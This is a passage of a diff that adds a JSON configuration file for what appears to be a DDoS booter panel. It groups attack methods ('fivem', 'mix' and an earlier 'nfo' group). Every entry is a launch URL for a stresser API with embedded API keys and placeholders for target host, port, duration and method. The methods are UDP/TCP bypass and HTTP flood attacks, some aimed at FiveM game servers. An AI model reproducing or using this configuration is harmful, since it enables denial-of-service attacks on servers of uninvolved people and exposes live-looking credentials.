+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "fivem":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPBPYASS",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>/players.json&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "mix":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"TCPBYPASSV2",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=http://<<$target>>:<<$port>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=64",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        }
+    }
+}
